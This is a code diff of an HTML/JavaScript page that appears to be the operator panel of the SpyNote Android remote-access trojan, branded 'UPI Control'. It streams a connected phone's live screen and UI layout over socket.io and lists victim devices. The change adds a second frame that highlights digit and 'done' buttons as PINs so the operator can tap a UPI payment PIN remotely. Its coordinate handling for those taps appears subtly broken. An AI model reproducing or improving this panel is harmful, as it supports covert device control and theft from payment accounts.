@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📱 SpyNote - UPI Control</title>
+    <title>📱 SpyNote Pro v7.3.1 - Dual Frame UPI Control</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
     <style>
@@ -21,28 +21,36 @@
         .active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; box-shadow: 0 0 20px #00ff88; }
         .disconnected { opacity: 0.4; }
 
-        #phone-frame {
-            width: 380px; height: 820px; margin: 30px auto; 
-            background: #111; border: 30px solid #222; border-radius: 60px; 
-            position: relative; cursor: pointer; touch-action: none;
+        #dual-frames {
+            display: flex; gap: 20px; position: absolute; top: 50%; left: 50%; 
+            transform: translate(-50%, -50%); max-width: 95vw; max-height: 75vh;
+        }
+        .phone-frame {
+            width: 340px; height: 740px; background: #111; border: 25px solid #222; 
+            border-radius: 50px; position: relative; cursor: pointer; touch-action: none;
             box-shadow: 0 25px 50px rgba(0,0,0,0.8), inset 0 0 20px rgba(255,255,255,0.1);
+            flex: 1;
         }
-        #screen-canvas { 
-            width: 100%; height: 100%; background: #000; border-radius: 25px;
-            image-rendering: pixelated; image-rendering: -moz-crisp-edges;
-        }
-        #layout-overlay {
+        #screen-canvas { width: 100%; height: 100%; background: #000; border-radius: 25px; image-rendering: pixelated; }
+        #layout-canvas { 
             position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
-            pointer-events: none; border-radius: 25px; z-index: 10;
+            pointer-events: none; border-radius: 25px; z-index: 20; background: rgba(0,0,0,0.1);
         }
+        .frame-label {
+            position: absolute; top: -35px; left: 50%; transform: translateX(-50%);
+            background: rgba(0,0,0,0.9); padding: 5px 15px; border-radius: 20px;
+            font-size: 12px; font-weight: 600; backdrop-filter: blur(10px);
+        }
+        #screen-label { color: #00ff88; }
+        #layout-label { color: #ff6b6b; }
+
         .layout-element {
             position: absolute; background: rgba(0,255,136,0.4); border: 2px solid #00ff88;
-            border-radius: 6px; transition: all 0.2s; cursor: pointer;
+            border-radius: 6px; transition: all 0.2s; cursor: pointer; pointer-events: all;
         }
-        .layout-element:hover { background: rgba(0,255,136,0.7); transform: scale(1.05); }
-        .pin-element { background: rgba(255,100,100,0.6) !important; border-color: #ff4444 !important; 
-            box-shadow: 0 0 15px rgba(255,68,68,0.8) !important; }
-        .pin-element:hover { background: rgba(255,68,68,0.9) !important; }
+        .layout-element:hover { background: rgba(0,255,136,0.7); transform: scale(1.05) !important; }
+        .pin-element { background: rgba(255,69,0,0.7) !important; border-color: #ff4444 !important; }
+        .pin-element:hover { background: rgba(255,69,0,1) !important; box-shadow: 0 0 15px #ff4444; }
 
         #stats { 
             position: fixed; top: 15px; right: 15px; background: rgba(0,0,0,0.9); 
@@ -62,7 +70,7 @@
         button:hover { transform: translateY(-3px); box-shadow: 0 8px 30px rgba(0,123,255,0.6); }
         .layout-toggle { background: linear-gradient(45deg, #ff6b6b, #ee5a5a); }
         .layout-toggle.active { background: linear-gradient(45deg, #00ff88, #00cc6a); }
-        #layout-count { font-weight: bold; color: #00ff88; }
+        .frame-toggle { background: linear-gradient(45deg, #ffaa00, #ff8800); }
     </style>
 </head>
 <body>
@@ -73,19 +81,30 @@
     
     <div id="stats">
         <div>Status: <span id="status" style="color: #ff6b6b;">Connecting...</span></div>
-        <div>FPS: <span id="fps">0</span> | Ping: <span id="ping">-</span> | Layout: <span id="layout-count">0</span></div>
+        <div>FPS: <span id="fps">0</span> | Ping: <span id="ping">-</span></div>
         <div>Device: <span id="deviceName">-</span></div>
+        <div>Layout: <span id="layoutCount">0</span> elements</div>
     </div>
 
-    <div id="phone-frame">
-        <canvas id="screen-canvas"></canvas>
-        <canvas id="layout-overlay"></canvas>
+    <div id="dual-frames">
+        <!-- Screen Frame -->
+        <div class="phone-frame" id="screen-frame">
+            <div class="frame-label" id="screen-label">🖥️ LIVE SCREEN</div>
+            <canvas id="screen-canvas"></canvas>
+        </div>
+        
+        <!-- Layout Frame -->
+        <div class="phone-frame" id="layout-frame">
+            <div class="frame-label" id="layout-label">🎯 UPI LAYOUT (Click PINs)</div>
+            <canvas id="layout-canvas"></canvas>
+        </div>
     </div>
 
     <div id="controls">
         <button onclick="sendBack()">🔙 Back</button>
         <button onclick="sendHome()">🏠 Home</button>
-        <button class="layout-toggle" onclick="toggleLayout()" id="layoutBtn">🗺️ Layout</button>
+        <button onclick="toggleLayout()" id="layoutBtn" class="layout-toggle">🗺️ Layout ON</button>
+        <button onclick="toggleFrames()" id="frameBtn" class="frame-toggle">📱 Dual→Single</button>
         <button onclick="toggleFullScreen()">📱 Full</button>
     </div>
 
@@ -95,19 +114,26 @@
         let deviceWidth = 1080, deviceHeight = 2400;
         let frameCount = 0, lastFrameTime = 0, avgFps = 0;
         let frameQueue = [];
-        let isDragging = false, dragStart = {};
-        let showLayout = false;
+        let layoutData = [];
+        let showLayout = true, showDualFrames = true;
+        let canvas, screenCtx, layoutCanvas, layoutCtx;
         let layoutElements = [];
-        let canvas, ctx, overlayCtx, phoneFrame;
-        let lastLayoutCount = 0;
+        let pingInterval;
 
+        // Initialize canvases
         canvas = document.getElementById('screen-canvas');
-        overlayCtx = document.getElementById('layout-overlay').getContext('2d');
-        phoneFrame = document.getElementById('phone-frame');
+        screenCtx = canvas.getContext('2d');
+        layoutCanvas = document.getElementById('layout-canvas');
+        layoutCtx = layoutCanvas.getContext('2d');
 
         socket.on('connect', () => {
             document.getElementById('status').textContent = '🟢 LIVE';
             document.getElementById('status').style.color = '#00ff88';
+            pingInterval = setInterval(() => socket.emit('ping'), 5000);
+        });
+
+        socket.on('pong', () => {
+            document.getElementById('ping').textContent = '✓';
         });
 
         socket.on('devices-update', (devices) => {
@@ -120,11 +146,15 @@
             frameQueue.push(data);
             if (frameQueue.length === 1) renderNextFrame();
             
+            // Update layout data
+            if (data.layout) layoutData = data.layout;
+            
             frameCount++;
             const now = performance.now();
             if (now - lastFrameTime >= 1000) {
                 avgFps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                 document.getElementById('fps').textContent = avgFps;
+                document.getElementById('layoutCount').textContent = layoutData.length;
                 frameCount = 0;
                 lastFrameTime = now;
             }
@@ -137,21 +167,17 @@
             const img = new Image();
             
             img.onload = () => {
-                const rect = phoneFrame.getBoundingClientRect();
-                canvas.width = rect.width;
-                canvas.height = rect.height;
-                
-                const screenCtx = canvas.getContext('2d');
+                // Screen Frame
+                const screenRect = document.getElementById('screen-frame').getBoundingClientRect();
+                canvas.width = screenRect.width;
+                canvas.height = screenRect.height;
                 screenCtx.imageSmoothingEnabled = false;
                 screenCtx.clearRect(0, 0, canvas.width, canvas.height);
                 screenCtx.drawImage(img, 0, 0, canvas.width, canvas.height);
                 
-                // 🔥 ALWAYS RENDER LAYOUT - Critical Fix
-                if (data.layout && data.layout.length > 0) {
-                    renderLayoutOverlay(data.layout, rect);
-                    document.getElementById('layout-count').textContent = data.layout.length;
-                } else {
-                    clearLayoutOverlay(rect);
+                // Layout Frame (always render if dual frames)
+                if (showDualFrames) {
+                    renderLayoutFrame(screenRect);
                 }
                 
                 if (frameQueue.length > 0) {
@@ -164,70 +190,43 @@
             deviceHeight = data.height || 2400;
         }
 
-        // 🔥 FIXED LAYOUT RENDERING - Shows EVERY Frame
-        function renderLayoutOverlay(layout, rect) {
-            const overlayCanvas = document.getElementById('layout-overlay');
-            overlayCanvas.width = rect.width;
-            overlayCanvas.height = rect.height;
-            
-            overlayCtx.clearRect(0, 0, rect.width, rect.height);
+        function renderLayoutFrame(rect) {
+            layoutCanvas.width = rect.width;
+            layoutCanvas.height = rect.height;
+            layoutCtx.clearRect(0, 0, rect.width, rect.height);
             layoutElements = [];
             
-            layout.forEach((element, index) => {
-                try {
-                    const bounds = element.bounds;
-                    const x = (bounds.left / deviceWidth) * rect.width;
-                    const y = (bounds.top / deviceHeight) * rect.height;
-                    const w = ((bounds.right - bounds.left) / deviceWidth) * rect.width;
-                    const h = ((bounds.bottom - bounds.top) / deviceHeight) * rect.height;
-                    
-                    if (w > 5 && h > 5 && x >= 0 && y >= 0) { // Valid bounds check
-                        const text = element.text || element.contentDescription || '';
-                        const isPin = element.isPin || text.match(/\d/) || text.toLowerCase().includes('pin') || 
-                                     text.toLowerCase().includes('pay') || text.toLowerCase().includes('done');
-                        
-                        // 🔥 Draw Rectangle
-                        overlayCtx.fillStyle = isPin ? 'rgba(255,68,68,0.5)' : 'rgba(0,255,136,0.4)';
-                        overlayCtx.strokeStyle = isPin ? '#ff4444' : '#00ff88';
-                        overlayCtx.lineWidth = 3;
-                        overlayCtx.strokeRect(x, y, w, h);
-                        
-                        // 🔥 Draw Text Label
-                        overlayCtx.font = 'bold 16px -apple-system, monospace';
-                        overlayCtx.fillStyle = isPin ? '#ff4444' : '#00ff88';
-                        overlayCtx.textAlign = 'left';
-                        overlayCtx.textBaseline = 'top';
-                        const displayText = text.slice(0,12) || 'Element';
-                        overlayCtx.fillText(displayText, x+4, y+20);
-                        
-                        // 🔥 Store for Click Detection
-                        layoutElements.push({ 
-                            x, y, w, h, 
-                            isPin, 
-                            centerX: bounds.centerX, 
-                            centerY: bounds.centerY,
-                            text: displayText 
-                        });
-                        
-                        if (isPin && lastLayoutCount !== layout.length) {
-                            console.log('🎯 PIN DETECTED:', displayText, `(${bounds.centerX},${bounds.centerY})`);
-                        }
-                    }
-                } catch(e) {
-                    console.error('Layout render error:', e);
-                }
+            layoutData.forEach((element, index) => {
+                const x = (element.bounds.left / deviceWidth) * rect.width;
+                const y = (element.bounds.top / deviceHeight) * rect.height;
+                const w = ((element.bounds.right - element.bounds.left) / deviceWidth) * rect.width;
+                const h = ((element.bounds.bottom - element.bounds.top) / deviceHeight) * rect.height;
+                
+                const isPin = element.text && (element.text.match(/\d/) || element.contentDescription?.match(/\d/));
+                const isDone = element.text?.toLowerCase().includes('done') || element.contentDescription?.toLowerCase().includes('done');
+                
+                // Draw element
+                layoutCtx.fillStyle = isPin ? 'rgba(255,69,0,0.6)' : (isDone ? 'rgba(255,215,0,0.6)' : 'rgba(0,255,136,0.4)');
+                layoutCtx.strokeStyle = isPin ? '#ff4444' : (isDone ? '#ffd700' : '#00ff88');
+                layoutCtx.lineWidth = 3;
+                layoutCtx.strokeRect(x, y, w, h);
+                layoutCtx.lineWidth = 1;
+                layoutCtx.fillRect(x, y, w, h);
+                
+                // Text label
+                layoutCtx.font = 'bold 16px monospace';
+                layoutCtx.fillStyle = isPin ? '#ff4444' : (isDone ? '#ffd700' : '#00ff88');
+                layoutCtx.textAlign = 'left';
+                const label = (element.text?.slice(0,6) || element.contentDescription?.slice(0,6) || 'Element').trim();
+                layoutCtx.fillText(label, x+8, y+24);
+                
+                layoutElements.push({ 
+                    x, y, w, h, 
+                    isPin, isDone, 
+                    centerX: (x + w/2), centerY: (y + h/2),
+                    element, index 
+                });
             });
-            
-            lastLayoutCount = layout.length;
-        }
-
-        function clearLayoutOverlay(rect) {
-            const overlayCanvas = document.getElementById('layout-overlay');
-            overlayCanvas.width = rect.width;
-            overlayCanvas.height = rect.height;
-            overlayCtx.clearRect(0, 0, rect.width, rect.height);
-            layoutElements = [];
-            document.getElementById('layout-count').textContent = '0';
         }
 
         function updateDeviceList(devices) {
@@ -236,7 +235,7 @@
                     <div class="device ${!info.connected ? 'disconnected' : ''}" 
                          onclick="selectDevice('${id}', this)">
                         <b>${info.model?.slice(0,12) || id.slice(0,8)}</b><br>
-                        <small>${info.brand || ''}</small><br>
+                        <small>${info.brand || ''} Android ${info.version || ''}</small><br>
                         <span style="color: ${info.connected ? '#00ff88' : '#ff6b6b'}">
                             ${info.connected ? '🟢 LIVE' : '🔴 OFF'}
                         </span>
@@ -252,70 +251,62 @@
             frameQueue = [];
         }
 
-        function getScaledCoords(clientX, clientY) {
-            const rect = phoneFrame.getBoundingClientRect();
+        function getScaledCoords(clientX, clientY, frameId) {
+            const rect = document.getElementById(frameId).getBoundingClientRect();
             return {
                 x: Math.floor((clientX - rect.left) * (deviceWidth / rect.width)),
                 y: Math.floor((clientY - rect.top) * (deviceHeight / rect.height))
             };
         }
 
-        // 🔥 Mouse Events
+        // Touch/Mouse events for BOTH frames
         ['mousedown', 'mousemove', 'mouseup'].forEach(event => {
-            phoneFrame.addEventListener(event, (e) => {
-                e.preventDefault();
-                const coords = getScaledCoords(e.clientX, e.clientY);
-                
-                if (event === 'mousedown') {
-                    isDragging = true;
-                    dragStart = coords;
-                    handleClick(coords);
-                } else if (event === 'mousemove' && isDragging) {
-                    sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
-                } else if (event === 'mouseup') {
-                    isDragging = false;
-                }
+            ['screen-frame', 'layout-frame'].forEach(frameId => {
+                document.getElementById(frameId).addEventListener(event, (e) => {
+                    e.preventDefault();
+                    handleInput(e, event, frameId);
+                });
             });
         });
 
-        // 🔥 Touch Events
         ['touchstart', 'touchmove', 'touchend'].forEach(event => {
-            phoneFrame.addEventListener(event, (e) => {
-                e.preventDefault();
-                const touch = e.touches[0] || e.changedTouches[0];
-                const coords = getScaledCoords(touch.clientX, touch.clientY);
-                
-                if (event === 'touchstart') {
-                    isDragging = true;
-                    dragStart = coords;
-                    handleClick(coords);
-                } else if (event === 'touchmove' && isDragging) {
-                    sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
-                } else if (event === 'touchend') {
-                    isDragging = false;
-                }
-            }, { passive: false });
+            ['screen-frame', 'layout-frame'].forEach(frameId => {
+                document.getElementById(frameId).addEventListener(event, (e) => {
+                    e.preventDefault();
+                    const touch = e.touches[0] || e.changedTouches[0];
+                    const fakeEvent = { clientX: touch.clientX, clientY: touch.clientY };
+                    handleInput(fakeEvent, event, frameId);
+                }, { passive: false });
+            });
         });
 
-        // 🔥 IMPROVED CLICK HANDLING
-        function handleClick(coords) {
-            if (!currentDevice || !showLayout) {
-                sendTap(coords.x, coords.y);
-                return;
-            }
+        let isDragging = false, dragStart = {};
+        function handleInput(e, eventType, frameId) {
+            const coords = getScaledCoords(e.clientX, e.clientY, frameId);
             
-            // Check layout element first
-            const clickedElement = layoutElements.find(el => 
-                coords.x >= el.x && coords.x <= (el.x + el.w) &&
-                coords.y >= el.y && coords.y <= (el.y + el.h)
-            );
-            
-            if (clickedElement) {
-                sendTap(clickedElement.centerX, clickedElement.centerY);
-                console.log('🎯 LAYOUT CLICK:', clickedElement.text, 
-                    `(${clickedElement.centerX},${clickedElement.centerY})`);
-            } else {
+            if (eventType === 'mousedown' || eventType === 'touchstart') {
+                isDragging = true;
+                dragStart = coords;
+                
+                // Layout frame: Click PIN directly
+                if (frameId === 'layout-frame') {
+                    const clickedElement = layoutElements.find(el => 
+                        coords.x >= el.x && coords.x <= (el.x + el.w) &&
+                        coords.y >= el.y && coords.y <= (el.y + el.h)
+                    );
+                    if (clickedElement) {
+                        sendTap(clickedElement.centerX * (deviceWidth / document.getElementById(frameId).getBoundingClientRect().width), 
+                                clickedElement.centerY * (deviceHeight / document.getElementById(frameId).getBoundingClientRect().height));
+                        console.log('🎯 PIN TAPPED:', clickedElement.element.text || clickedElement.element.contentDescription);
+                        return;
+                    }
+                }
                 sendTap(coords.x, coords.y);
+                
+            } else if ((eventType === 'mousemove' || eventType === 'touchmove') && isDragging) {
+                sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
+            } else if (eventType === 'mouseup' || eventType === 'touchend') {
+                isDragging = false;
             }
         }
 
@@ -341,6 +332,25 @@
             const btn = document.getElementById('layoutBtn');
             btn.textContent = showLayout ? '📋 Hide Layout' : '🗺️ Show Layout';
             btn.classList.toggle('active');
+        }
+
+        function toggleFrames() {
+            showDualFrames = !showDualFrames;
+            const btn = document.getElementById('frameBtn');
+            const dualFrames = document.getElementById('dual-frames');
+            
+            if (showDualFrames) {
+                dualFrames.style.display = 'flex';
+                btn.textContent = '📱 Dual→Single';
+                btn.style.background = 'linear-gradient(45deg, #ffaa00, #ff8800)';
+                document.getElementById('layout-frame').style.display = 'block';
+            } else {
+                dualFrames.style.flexDirection = 'column';
+                dualFrames.style.gap = '10px';
+                btn.textContent = '📱 Single→Dual';
+                btn.style.background = 'linear-gradient(45deg, #00ff88, #00cc6a)';
+                btn.classList.add('active');
+            }
         }
 
         function toggleFullScreen() {
